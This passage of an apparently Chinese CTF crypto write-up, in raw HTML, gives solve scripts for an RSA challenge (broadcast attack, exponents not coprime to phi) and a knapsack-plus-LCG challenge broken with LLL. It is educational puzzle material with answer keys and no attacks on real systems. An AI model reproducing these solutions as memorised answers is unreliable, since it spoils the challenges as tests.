class="hljs-comment">#print(&#x27;ce1_len=&#x27;,len(bin(ce1)[2:]))</span><br><span class="hljs-comment">#print(&#x27;ce2_len=&#x27;,len(bin(ce2)[2:]))</span><br><span class="hljs-comment">#print(&#x27;e1^42_len_approx=&#x27;,16*42)</span><br><span class="hljs-comment">#print(&#x27;tmp_len=&#x27;,len(bin(tmp)[2:]))</span><br><span class="hljs-comment">#print(&#x27;(e2+tmp)^3_len=&#x27;,688*3)</span><br>e1=gp.iroot(ce1,<span class="hljs-number">42</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e1=&#x27;</span>,e1)<br>k=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>root=gp.iroot(ce2+k*n,<span class="hljs-number">3</span>)<br><span class="hljs-keyword">if</span> root[<span class="hljs-number">1</span>]==<span class="hljs-literal">True</span>:<br>e2=root[<span class="hljs-number">0</span>]-tmp<br><span class="hljs-keyword">break</span><br>k+=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e2=&#x27;</span>,e2)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">e1= 15218928658178</span><br><span class="hljs-string">e2= 381791429275130</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>前面的第一部分，应该是求p,对p^4 %n==c给了四组n,c，联想到广播攻击，直接用中国剩余定理求解即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br>n =  [<span class="hljs-number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423</span>, <span class="hljs-number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421</span>, <span class="hljs-number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303</span>, <span class="hljs-number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791</span>]<br>c =  [<span class="hljs-number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569</span>, <span class="hljs-number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031</span>, <span class="hljs-number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446</span>, <span class="hljs-number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797</span>]<br>p_4,mode=crt(n,c)<br>p=gp.iroot(p_4,<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-comment">#print(p)</span><br></code></pre></td></tr></table></figure><p>现在万事俱备，只差解出flag</p><script type="math/tex; mode=display">c_1=flag^{e1}\%(p*q1)\\c_2=flag^{e2}\%(p*q2)</script><p>已知c1,c2,p,q1,q2,e1,e2,按理说对每一组都能直接求flag,但是发现e1和(p-1)(q1-1)不互素，e2和(p-1)(q2-1)不互素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">g1=gp.gcd(e1,phi1)--&gt;<span class="hljs-number">14</span><br>g2=gp.gcd(e2,phi2)--&gt;<span class="hljs-number">14</span><br></code></pre></td></tr></table></figure><p>可以构造m^14,使e1=e1//14和e2=e2//14,这样公钥就和phi互素，可以分别求其私钥</p><script type="math/tex; mode=display">c1=(m^{14})^{e1//14}(modp*q1)\\c2=(m^{14})^{e2//14}(modp*q2)</script><p>利用rsa原理可求出</p><script type="math/tex; mode=display">m^{14}=c1^{d1}=a1(modp*q1)\\m^{14}=c1^{d2}=a2(modp*q2)</script><p>可分解为：</p><script type="math/tex; mode=display">m^{14}=a1\%p=b1(modp)\\m^{14}=a1\%q1=b2(modq1)\\m^{14}=a2\%q2=b3(modq2)</script><p>一开始我想的就是这任意两个式子用中国剩余定理求m^14，再开14次方就能求，但实际上不行</p><p>接着细化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">g1=gp.gcd(<span class="hljs-number">14</span>,p-<span class="hljs-number">1</span>)--&gt;<span class="hljs-number">14</span><br>g2=gp.gcd(<span class="hljs-number">14</span>,q1-<span class="hljs-number">1</span>)--&gt;<span class="hljs-number">2</span><br>g3=gp.gcd(<span class="hljs-number">14</span>,q2-<span class="hljs-number">1</span>)--&gt;<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>选择后面两个，按照rsa原理，构造m^2</p><script type="math/tex; mode=display">m^2=b2^{d3}(modq1)\\m^2=b3^{d4}(modq2)</script><p>再由中国剩余定理求出m^2,开方得到flag</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br>n =  [<span class="hljs-number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423</span>, <span class="hljs-number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421</span>, <span class="hljs-number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303</span>, <span class="hljs-number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791</span>]<br>c =  [<span class="hljs-number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569</span>, <span class="hljs-number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031</span>, <span class="hljs-number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446</span>, <span class="hljs-number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797</span>]<br><span class="hljs-comment">#p_4,mode=crt(n,c)</span><br><span class="hljs-comment">#print(&#x27;p_4=&#x27;,p_4)</span><br>p_4=<span class="hljs-number">146068806215073497344459876631371603884129554507314987227041386431864296983800292232765852493230146632246223391161616274352995602128509562953556195654254929572680238155614318159006433172894208760309766144817665852858474274746295434459658946786114485553768622540321693696983334739989582184316792317376817587284066141025953893816735983622448994863347051427279673308801466174898201800602688359956097373676655607179834345973775227535147398518523539179261883968140504230643073698857288314127486345168652339309386405706576632120711116391426300160476076254612138216623537070845645803721685414583459545099925250474009703135469241079408739336592005949980987466671054020054633554508243871664072158338203090563533576053886607251476483441992750608537110739543678599105838456537686029895264928334606913181627024815548789841726411333636163152202116487198575625907392074866811580053962217284776220330628233642351622897902940633662074194963147661868086182955886918339487179905557899816215131118989868243555958033477834658657082003718410617182774845820310639577794302769424451100567749840744304334325501306470124397022077759031911677326433654909824518845224227308515695216456907499080502091628962571645468099748573164070147303131348996440422701533681</span><br>p=gp.iroot(p_4,<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-comment">#print(p)</span><br>e1= <span class="hljs-number">15218928658178</span><br>e2= <span class="hljs-number">381791429275130</span><br>q2 =  <span class="hljs-number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span><br>c1 =  <span class="hljs-number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span><br>c2 =  <span class="hljs-number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span><br>q1=<span class="hljs-number">127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871</span><br>e1=e1//<span class="hljs-number">14</span><br>e2=e2//<span class="hljs-number">14</span><br>phi1=(p-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>)<br>phi2=(p-<span class="hljs-number">1</span>)*(q2-<span class="hljs-number">1</span>)<br><span class="hljs-comment">#g1=gp.gcd(e1,phi1)</span><br><span class="hljs-comment">#g2=gp.gcd(e2,phi2)</span><br><span class="hljs-comment">#print(g1)</span><br><span class="hljs-comment">#print(g2)</span><br>d1=gp.invert(e1,phi1)<br>d2=gp.invert(e2,phi2)<br>m1=<span class="hljs-built_in">pow</span>(c1,d1,q1)<br>m2=<span class="hljs-built_in">pow</span>(c2,d2,q2)<br>m3=<span class="hljs-built_in">pow</span>(c1,d1,p)<br><span class="hljs-comment">#g1=gp.gcd(14,p-1)</span><br><span class="hljs-comment">#g2=gp.gcd(14,q1-1)</span><br><span class="hljs-comment">#g3=gp.gcd(14,q2-1)</span><br><span class="hljs-comment">#print(g1,g2,g3)</span><br>d1=gp.invert(<span class="hljs-number">7</span>,q1-<span class="hljs-number">1</span>)<br>d2=gp.invert(<span class="hljs-number">7</span>,q2-<span class="hljs-number">1</span>)<br>new_m1=<span class="hljs-built_in">pow</span>(m1,d1,q1)<br>new_m2=<span class="hljs-built_in">pow</span>(m2,d2,q2)<br>res1,mode=crt([q1,q2],[new_m1,new_m2])<br>flag=gp.iroot(res1,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(long_to_bytes(flag))<br></code></pre></td></tr></table></figure><h2 id="4-LBP"><a href="#4-LBP" class="headerlink" title="4.LBP"></a>4.LBP</h2><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gcd<br><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> dot<br><br>nbits = <span class="hljs-number">32</span><br>msg = getRandomNBitInteger(nbits)<br>flag = <span class="hljs-string">b&#x27;flag&#123;sha256(msg)&#125;&#x27;</span><br>tmp_m = <span class="hljs-built_in">bin</span>(msg)[<span class="hljs-number">2</span>:]<br>f_list = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tmp_m)):<br>    f_list.append(<span class="hljs-built_in">int</span>(tmp_m[i]))<br><br>r_list =[randint(<span class="hljs-number">20</span>, <span class="hljs-number">50</span>)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbits - <span class="hljs-number">1</span>):<br>    r_list.append(randint(<span class="hljs-number">2</span> * r_list[-<span class="hljs-number">1</span>], <span class="hljs-number">3</span> * r_list[-<span class="hljs-number">1</span>]))  <br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    A = randint(<span class="hljs-number">2</span> * r_list[-<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>, <span class="hljs-number">3</span> * r_list[-<span class="hljs-number">1</span>])<br>    B = randint(<span class="hljs-number">2</span> * r_list[-<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>, <span class="hljs-number">3</span> * r_list[-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">if</span> gcd(A, B) == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br><br>M = [A * x % B <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> r_list]  <br><br>S = dot(f_list, M)<br><span class="hljs-built_in">print</span>(S)<br><br><br>seed = getRandomNBitInteger(<span class="hljs-number">30</span>)<br>s = [<span class="hljs-number">0</span>] * nbits<br>s[<span class="hljs-number">0</span>] = seed<br>m = getRandomNBitInteger(<span class="hljs-number">20</span>)<br>c = getPrime(<span class="hljs-number">24</span>)<br>n = <span class="hljs-number">991125622</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, nbits):<br>    s[i] = (s[i-<span class="hljs-number">1</span>]*m+c)%n<br><span class="hljs-built_in">print</span>(s[<span class="hljs-number">0</span>], s[<span class="hljs-number">1</span>], s[<span class="hljs-number">2</span>])<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbits):        <br>    M[t] = M[t] + s[t]<br><span class="hljs-built_in">print</span>(M)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">492226042629702</span><br><span class="hljs-string">562734112 859151551 741682801</span><br><span class="hljs-string">M = [19621141192340, 39617541681643, 3004946591889, 6231471734951, 3703341368174, 48859912097514, 4386411556216, 11028070476391, 18637548953150, 29985057892414, 20689980879644, 20060557946852, 46908191806199, 8849137870273, 28637782510640, 35930273563752, 20695924342882, 36660291028583, 10923264012354, 29810154308143, 4444597606142, 31802472725414, 23368528779283, 15179021971456, 34642073901253, 44824809996134, 31243873675161, 27159321498211, 2220647072602, 20255746235462, 24667528459211, 46916059974372]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>做过bp那道题后，看这题很容易看出这是一个背包密码，但明显没有给出A,B或者相关求法，只知道公钥，这就需要用到LLL算法求解，可以参考下面的博客</p><p><a href="https://blog.csdn.net/qq_51999772/article/details/126795199">https://blog.csdn.net/qq_51999772/article/details/126795199</a></p><p>对这一题：</p><p>第一步：利用s[0],s[1],s[2]解出m,c,再解出整个s[]</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">s[<span class="hljs-number">1</span>]=(s[<span class="hljs-number">0</span>]*m+c)%n<br>s[<span class="hljs-number">2</span>]=(s[<span class="hljs-number">1</span>]*m+c)%n<br>--&gt;<br>s[<span class="hljs-number">2</span>]-s[<span class="hljs-number">1</span>]=((s[<span class="hljs-number">1</span>]-s[<span class="hljs-number">0</span>])*m)%n<br>m=((s[<span class="hljs-number">2</span>]-s[<span class="hljs-number">1</span>])*gp.invert(s[<span class="hljs-number">1</span>]-s[<span class="hljs-number">0</span>],n))%n<br>--&gt;<br>c=(s[<span class="hljs-number">1</span>]-s[<span class="hljs-number">0</span>]*m)%n<br>--&gt;<br>s[i] = (s[i-<span class="hljs-number">1</span>]*m+c)%n<br></code></pre></td></tr></table></figure><p>第二步：利用s[]，还原M[]</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">M[t] = M[t] - s[t]<br></code></pre></td></tr></table></figure><p>第三步：利用LLL求解背包问题即flag的2进制序列</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212192149102.png" alt="image-20221219214930925"></p><p>由此可证明可以用LLL算法求解背包密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">A = Matrix(ZZ, nbits + <span class="hljs-number">1</span>, nbits + <span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbits):<br>    A[i, i] = <span class="hljs-number">1</span><br>    A[i, nbits] = M[i]<br>A[nbits,nbits] = -<span class="hljs-built_in">int</span>(S)<br>res = A.LLL()<br></code></pre></td></tr></table></figure><p>第四步：由二进制序列得到msg,求sha256(msg)</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br> <br>nbits = <span class="hljs-number">32</span><br>S = <span class="hljs-number">492226042629702</span><br>n = <span class="hljs-number">991125622</span><br>s =[<span class="hljs-number">562734112</span>, <span class="hljs-number">859151551</span>, <span class="hljs-number">741682801</span>]<br>M = [<span class="hljs-number">19621141192340</span>, <span class="hljs-number">39617541681643</span>, <span class="hljs-number">3004946591889</span>, <span class="hljs-number">6231471734951</span>, <span class="hljs-number">3703341368174</span>, <span class="hljs-number">48859912097514</span>, <span class="hljs-number">4386411556216</span>, <span class="hljs-number">11028070476391</span>, <span class="hljs-number">18637548953150</span>, <span class="hljs-number">29985057892414</span>, <span class="hljs-number">20689980879644</span>, <span class="hljs-number">20060557946852</span>, <span class="hljs-number">46908191806199</span>, <span class="hljs-number">8849137870273</span>, <span class="hljs-number">28637782510640</span>, <span class="hljs-number">35930273563752</span>, <span class="hljs-number">20695924342882</span>, <span class="hljs-number">36660291028583</span>, <span class="hljs-number">10923264012354</span>, <span class="hljs-number">29810154308143</span>, <span class="hljs-number">4444597606142</span>, <span class="hljs-number">31802472725414</span>, <span class="hljs-number">23368528779283</span>, <span class="hljs-number">15179021971456</span>, <span class="hljs-number">34642073901253</span>, <span class="hljs-number">44824809996134</span>, <span class="hljs-number">31243873675161</span>, <span class="hljs-number">27159321498211</span>, <span class="hljs-number">2220647072602</span>, <span class="hljs-number">20255746235462</span>, <span class="hljs-number">24667528459211</span>, <span class="hljs-number">46916059974372</span>]<br> <br><span class="hljs-comment">#求m,c</span><br>m = (s[<span class="hljs-number">2</span>]-s[<span class="hljs-number">1</span>])*invert((s[<span class="hljs-number">1</span>]-s[<span class="hljs-number">0</span>]),n) %n<br>c = (s[<span class="hljs-number">1</span>]-s[<span class="hljs-number">0</span>]*m )%n<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>,<span class="hljs-number">32</span>):<br>    s.append(<span class="hljs-built_in">int</span>(s[i-<span class="hljs-number">1</span>]*m + c)%n)<br><span class="hljs-comment">#还原M</span><br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbits):<br>    M[t] = M[t] - s[t]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;M =&#x27;</span>,M)<br><span class="hljs-comment">#M = [19620578458228, 39616682530092, 3004204909088, 6231457508054, 3702963666023, 48859283851499, 4385984544187, 11027662187202, 18637179189873, 29985033726663, 20689315151593, 20060155940897, 46908062454518, 8848251127828, 28637097081675, 35930247189963, 20695167327567, 36659598017280, 10923228050453, 29810039803392, 4443991557077, 31801732862419, 23368424737916, 15178683835989, 34641771567914, 44824471397533, 31243260877608, 27158599500744, 2219939459559, 20255089091807, 24667494760808, 46915118179747]</span><br></code></pre></td></tr></table></figure><p>在sage中运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">M = [<span class="hljs-number">19620578458228</span>, <span class="hljs-number">39616682530092</span>, <span class="hljs-number">3004204909088</span>, <span class="hljs-number">6231457508054</span>, <span class="hljs-number">3702963666023</span>, <span class="hljs-number">48859283851499</span>, <span class="hljs-number">4385984544187</span>, <span class="hljs-number">11027662187202</span>, <span class="hljs-number">18637179189873</span>, <span class="hljs-number">29985033726663</span>, <span class="hljs-number">20689315151593</span>, <span class="hljs-number">20060155940897</span>, <span class="hljs-number">46908062454518</span>, <span class="hljs-number">8848251127828</span>, <span class="hljs-number">28637097081675</span>, <span class="hljs-number">35930247189963</span>, <span class="hljs-number">20695167327567</span>, <span class="hljs-number">36659598017280</span>, <span class="hljs-number">10923228050453</span>, <span class="hljs-number">29810039803392</span>, <span class="hljs-number">4443991557077</span>, <span class="hljs-number">31801732862419</span>, <span class="hljs-number">23368424737916</span>, <span class="hljs-number">15178683835989</span>, <span class="hljs-number">34641771567914</span>, <span class="hljs-number">44824471397533</span>, <span class="hljs-number">31243260877608</span>, <span class="hljs-number">27158599500744</span>, <span class="hljs-number">2219939459559</span>, <span class="hljs-number">20255089091807</span>, <span class="hljs-number">24667494760808</span>, <span class="hljs-number">46915118179747</span>]<br>S=<span class="hljs-number">492226042629702</span><br>A = Matrix(ZZ, nbits + <span class="hljs-number">1</span>, nbits + <span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbits):<br>    A[i, i] = <span class="hljs-number">1</span><br>    A[i, nbits] = M[i]<br>A[nbits,nbits] = -<span class="hljs-built_in">int</span>(S)<br> <br>res = A.LLL()<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212192202703.png" 